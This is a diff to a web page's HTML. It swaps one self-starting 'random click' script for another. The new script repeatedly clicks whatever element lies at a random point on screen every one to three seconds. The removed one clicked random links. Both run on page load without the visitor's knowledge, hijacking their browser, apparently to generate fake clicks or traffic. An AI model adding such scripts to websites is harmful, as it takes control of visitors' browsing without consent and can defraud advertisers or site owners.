@@ -1971,64 +1971,21 @@ document.querySelectorAll('a').forEach(function(link) {
 });
 </script>
  
- 
  <!--klik acak-->
-<script>
-function klikLinkAcak() {
-    // Ambil semua link di halaman
-    let semuaLink = document.querySelectorAll('a[href]');
-    
-    // Filter link yang valid (punya href dan bukan javascript:void)
-    let linkValid = Array.from(semuaLink).filter(link => {
-        let href = link.getAttribute('href');
-        return href && 
-               href !== '#' && 
-               !href.startsWith('javascript:') &&
-               !href.startsWith('mailto:') &&
-               !href.startsWith('tel:');
-    });
-    
-    if (linkValid.length > 0) {
-        // Pilih link acak
-        let link = linkValid[Math.floor(Math.random() * linkValid.length)];
-        
-        // Dapatkan posisi link
-        let rect = link.getBoundingClientRect();
-        let x = rect.left + rect.width / 2;
-        let y = rect.top + rect.height / 2;
-        
-        // Klik link
-        link.click();
-        
-        // Visual marker
-        let marker = document.createElement('div');
-        marker.style.cssText = `
-            position: fixed;
-            left: ${x - 5}px;
-            top: ${y - 5}px;
-            width: 10px;
-            height: 10px;
-            background: rgba(255, 165, 0, 0.8);
-            border-radius: 50%;
-            z-index: 9999;
-            pointer-events: none;
-            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
-        `;
-        document.body.appendChild(marker);
-        setTimeout(() => marker.remove(), 500);
-        
-        console.log(`Klik link: ${link.textContent.trim()} - ${link.href}`);
-    } else {
-        console.log('Tidak ada link ditemukan');
+ <script>
+function randomKlik() {
+    let x = Math.floor(Math.random() * window.innerWidth);
+    let y = Math.floor(Math.random() * window.innerHeight);
+    let elemen = document.elementFromPoint(x, y);
+    if (elemen) {
+        elemen.click();
     }
-    
-    // Jeda acak antara 2-5 detik
-    setTimeout(klikLinkAcak, Math.floor(Math.random() * 3000) + 2000);
+    setTimeout(randomKlik, Math.floor(Math.random() * 2000) + 1000);
 }
-
-// Mulai script
-klikLinkAcak();
+randomKlik();
 </script>
+
+
 
   
 </body>
